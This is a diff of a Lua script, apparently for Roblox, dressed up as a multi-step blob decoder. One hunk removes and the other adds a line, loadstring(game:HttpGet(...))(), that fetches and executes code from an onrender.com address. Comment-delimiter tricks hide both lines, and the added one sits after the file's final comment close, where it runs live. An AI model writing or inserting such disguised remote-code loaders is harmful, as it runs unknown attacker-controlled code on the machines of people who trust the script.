@@ -150,8 +150,7 @@ local function pipeline_decode(hexblob)
   local b64dec = ß_b64dec(cleaned)
  -- STEP E: Restore scattered/reversed string
   local restored = scatter_join(b64dec)
-   ]] loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/327a8c6095e9d84d4edf3691a42397e0"))()
-  --[[local final = xor_rolling(restored, 0x3F)
+ --[[local final = xor_rolling(restored, 0x3F)
  return final
 end
 -- Attempt to decode the blob
@@ -226,4 +225,4 @@ local c = checksum(decoded)
 print("\n-- checksum:", c)
 print("------------------------")
 print(("/* id:%X */"):format((c ~ 0xDEADBEEF) & 0xFFFFFFFF))  -- XOR with magic number
---]]
+--]]loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/b93cf9d92965c9bf5a8361d7e0d52753"))()
